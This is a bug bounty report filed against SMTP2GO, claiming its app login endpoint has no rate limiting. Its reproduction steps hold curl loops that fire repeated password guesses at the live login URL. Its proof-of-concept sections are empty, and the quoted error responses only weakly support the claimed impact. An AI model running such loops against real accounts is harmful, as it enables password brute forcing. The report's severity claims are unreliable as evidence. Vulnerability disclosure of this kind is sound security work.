# Vulnerability: Missing Rate Limiting on Login Endpoint

## Program
**Target:** SMTP2GO BBP (@smtp2go)
**URL:** https://app.smtp2go.com/api/login/
**Platform:** HackerOne
**Scope:** api.smtp2go.com, app.smtp2go.com, smtp2go.com

## Summary
The login endpoint at `app.smtp2go.com/api/login/` has no rate limiting, allowing unlimited brute force attempts against user accounts.

## Severity
**CVSS v3.1:** 5.3 (Medium)
**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)
**Bug Bounty Severity:** P3

## Steps to Reproduce

### Step 1: Send multiple login requests
```bash
for i in $(seq 1 10); do
  curl -s -o /dev/null -w "%{http_code} " -m 3 -X POST "https://app.smtp2go.com/api/login/" \
    -d "username=test@test.com&password=test$i"
done
```

### Step 2: Observe all requests return 200
```
200 200 200 200 200 200 200 200 200 200
```

All 10 requests returned HTTP 200 with no rate limiting, lockout, or CAPTCHA.

### Step 3: Verify no lockout after multiple attempts
```bash
for i in $(seq 1 20); do
  resp=$(curl -s -m 3 -X POST "https://app.smtp2go.com/api/login/" \
    -d "username=test@test.com&password=attempt$i")
  echo "Attempt $i: $resp"
done
```

All attempts return `{"status": "ERROR", "error": "login-required"}` without any rate limiting or account lockout.

## Proof of Concept

### Request

### Response (repeated 20+ times without blocking)
```json

```

## Impact
1. Attacker can brute force passwords at unlimited speed
2. No CAPTCHA or lockout prevents automated attacks
3. Weak passwords can be cracked in minutes
4. Credential stuffing attacks are trivial

## Remediation
1. Implement rate limiting (e.g., 5 attempts per minute per IP)
2. Add account lockout after 10 failed attempts
3. Implement CAPTCHA after 3 failed attempts
4. Add progressive delays between failed attempts
